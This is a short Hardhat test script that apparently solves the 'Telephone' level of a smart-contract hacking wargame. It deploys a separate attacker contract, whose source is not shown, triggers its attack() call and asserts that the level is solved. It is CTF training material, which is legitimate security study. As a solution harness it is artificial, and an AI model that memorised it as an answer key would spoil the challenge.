import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Telephone`);
    const challengeAddress = await createChallenge(
        `0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe`
    );
    challenge = await challengeFactory.attach(challengeAddress);

    const attackerFactory = await ethers.getContractFactory(
        `TelephoneAttacker`
    );
    attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
    let tx = await attacker.attack({
        gasPrice: ethers.utils.parseUnits("3", "gwei"),
        gasLimit: 2100000,
    });
    await tx.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
